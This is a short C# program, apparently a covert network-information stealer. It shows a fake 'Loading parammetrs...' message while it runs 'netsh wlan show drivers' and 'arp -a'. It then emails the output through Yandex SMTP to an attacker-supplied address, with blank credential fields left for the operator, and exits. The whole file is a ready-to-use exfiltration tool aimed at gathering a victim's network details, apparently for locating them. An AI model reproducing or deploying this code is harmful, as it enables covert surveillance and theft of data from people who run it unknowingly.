using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Threading;

namespace cmdReader
{
    class Program
    {
        public static void SendMsg(Object msg)
        {
            string message = (string)msg;

            const string MailAddressFrom = "";      //enter data
            const string MailPasswordFrom = "";     //enter data
            const string MailAddressTo = "";        //enter data

            using (MailMessage mm = new MailMessage("Bssid to location <" + MailAddressFrom + ">", MailAddressTo))
            {
                mm.Subject = "info ip";
                mm.Body = message;
                mm.IsBodyHtml = false;

                //for sending I used yandex mail, if you need another please enter data from the mail you need
                using (SmtpClient sc = new SmtpClient("smtp.yandex.ru", 25))
                {
                    sc.EnableSsl = true;
                    sc.DeliveryMethod = SmtpDeliveryMethod.Network;
                    sc.UseDefaultCredentials = false;
                    sc.Credentials = new NetworkCredential(MailAddressFrom, MailPasswordFrom);
                    sc.Send(mm);
                };
            };
            Environment.Exit(0);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Loading parammetrs...");
            Process checkWlanProcess = new Process();
            checkWlanProcess.StartInfo.UseShellExecute = false;
            checkWlanProcess.StartInfo.RedirectStandardOutput = true;
            checkWlanProcess.StartInfo.FileName = "netsh";
            checkWlanProcess.StartInfo.Arguments = "wlan show drivers";
            checkWlanProcess.Start();


            Process checkLanProcess = new Process();
            checkLanProcess.StartInfo.UseShellExecute = false;
            checkLanProcess.StartInfo.RedirectStandardOutput = true;
            checkLanProcess.StartInfo.FileName = "arp";
            checkLanProcess.StartInfo.Arguments = "-a";
            checkLanProcess.Start();

            string wlanInfoOut = checkWlanProcess.StandardOutput.ReadToEnd();

            string lanInfoOut = checkLanProcess.StandardOutput.ReadToEnd();

            Thread myThread = new Thread(new ParameterizedThreadStart(SendMsg));
            myThread.Start(wlanInfoOut + lanInfoOut);


        }
    }
}
